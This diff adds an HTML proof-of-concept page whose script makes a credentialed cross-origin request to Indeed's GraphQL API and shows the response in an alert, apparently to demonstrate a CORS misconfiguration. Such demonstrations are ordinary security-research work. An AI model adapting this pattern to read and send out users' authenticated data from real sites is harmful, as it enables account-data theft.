@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get', 'apis.indeed.com/graphql?co=IN&locale=en-IN', true);
+    req.withCredentials = true;
+    req.send('{}');
+
+    function reqListener() {
+        alert(this.responseText);
+    };
+</script>
+
+</html>
